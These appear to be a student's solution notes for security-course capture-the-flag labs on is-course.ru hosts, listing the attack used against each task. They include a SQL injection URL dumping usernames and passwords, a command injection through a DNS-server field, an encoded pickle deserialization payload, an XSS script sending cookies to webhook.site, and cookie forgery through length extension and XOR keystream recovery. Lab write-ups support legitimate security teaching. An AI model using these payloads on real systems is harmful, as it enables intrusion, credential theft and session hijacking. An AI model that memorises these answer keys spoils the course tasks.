## https://sql-injection-simple.is-course.ru/

1. fetch("https://sql-injection-simple.is-course.ru/?search=' union all select null, null, username, password FROM users;--", {"method": "GET"})
2. https://md5decrypt.net/en/
3. login
4. https://sql-injection-simple.is-course.ru/admin/

## https://cmd.is-course.ru

1. curl -X POST https://cmd.is-course.ru -d "command=curl ifconfig.co/ip" -d "dns-server=8.8.8.8; ls /home/app"
2. curl -X POST https://cmd.is-course.ru -d "command=curl ifconfig.co/ip" -d "dns-server=8.8.8.8; cat /home/app/flag_525d1d0910b9675d8fb77881b55aa729.txt"

## https://unserialize.is-course.ru

1. run pickle_reader.py
2. paste to import gASVigAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxuX19pbXBvcnRfXygndHlwZXMnKS5TaW1wbGVOYW1lc3BhY2UoY2xpY2tzPV9faW1wb3J0X18oJ3BhdGhsaWInKS5QYXRoKCdmbGFnLnR4dCcpLnJlYWRfdGV4dChlbmNvZGluZz0ndXRmLTgnKSmUhZRSlC4=

## https://sql-injection-medium.is-course.ru

1. run register_unique_break.py
2. https://md5decrypt.net/en/
3. https://sql-injection-medium.is-course.ru/login
4. response X-Task-Flag header

## https://xxe.is-course.ru

1. run xxe_middle.py with replaced host of sender.dtd and where to send result
2. give file

## https://cats.is-course.ru

1. testtest
2. Qwerty123456789!
3. https://cats.is-course.ru/feedback
4. give link to cats.html

## https://stored-xss.iscourse.ru

1. testtest
2. Qwerty123456789!
3. https://stored-xss.iscourse.ru/feedback
4. create post with
<script>
new Image().src = "https://webhook.site/<your>/?c=" + encodeURIComponent(document.cookie);
</script>
5. give link to post to feedback
6. take cookie
7. curl -b "session=<cookie>" https://stored-xss.iscourse.ru

## https://extender.is-course.ru

1. testtest
2. Qwerty123456789!
3. take cookie
4. echo "" | base64 -d
5. take last part and extend it given key 32, message smth:smth:testtest, to add :admin
6. reconstruct cookie with admin hexed and new cookie
7. curl "https://extender.is-course.ru/" -H "Cookie: session=<>"

## RSA: a lot in common

1. nc is-course.ru 7004
2. 
encrypt = (message ^ 65537) mod n
decrypt = (message ^ d) mod n
n = p * q
later n is calculated using shared p so decryption can be replicated after getting initial q
3. give arguments to RSA.py

## AES: [A]verage [E]njoyer of [S]ymmetric ciphers

1. aes_crack.py

makes so that only one unknown byte of flag is in block and checks how all varients are encrypted

## xor: the pillar of cryptography

1. https://pillar.is-course.ru
2. only test:test user available
3. cookie = base64(`(username + ":" + str(unix_timestamp)) XOR keystream`) and keystream is reset each minute
4. login as test:test and get cookie
5. recover the keystream:
   - `KS[0:5] = C[0:5] XOR "test:"`
   - `KS[5:14] = C[5:14] XOR str(server_unix_ts)` (timestamp = nginx Date)
6. give cookies based on `admin:str(T)[9]` + `0..255` (last byte bruteforced)
`curl -b "session=<base64>" https://pillar.is-course.ru/`

## HMAC: moodquery

1. moodquery.py
for anonymous hmac both secret and message are known from source so forging request is trivial
2. no symlinks found, no logs found, all hashes are high entropy
